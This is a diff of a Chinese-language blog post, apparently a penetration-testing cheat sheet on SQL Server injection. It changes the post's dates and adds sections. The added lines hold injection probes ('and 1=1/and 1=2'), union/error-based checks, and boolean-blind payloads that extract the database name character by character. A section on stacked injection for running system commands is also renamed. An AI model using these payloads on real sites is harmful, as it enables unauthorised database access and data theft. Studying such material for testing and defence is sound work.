@@ -10,8 +10,8 @@ draft = false
 <!--
  * @Author: reber
  * @Mail: 1070018473@qq.com
- * @Date: 2019-09-04 10:45:01
- * @LastEditTime: 2019-05-08 16:09:15
+ * @Date: 2018-09-04 10:45:01
+ * @LastEditTime: 2019-05-09 15:37:13
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -40,9 +40,12 @@ ORIGINAL_LOGIN();
 --sa
 ```
 
-### 0x01 利用报错注入数据
+### 0x01 UNION query & error-based 注入
 * 判断存在注入
 
+```
+and 1=1/and 1=2
+```
 ```
 select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end);
 
@@ -79,7 +82,17 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 * 得到数据库test的表article的数据
 ![75](/img/post/20180904-113720.png)
 
-### 0x02 堆叠注入
+### 0x02 boolean-based blind 注入
+```
+?id=1 and substring(db_name(),1,1)='a' --
+?id=1 and substring(db_name(),1,1)='b' --
+```
+
+```
+?id=1 and unicode(substring((select db_name()),1,1))>88 --
+```
+
+### 0x03 Stacked 注入
 * 执行系统命令
 
 ```bash
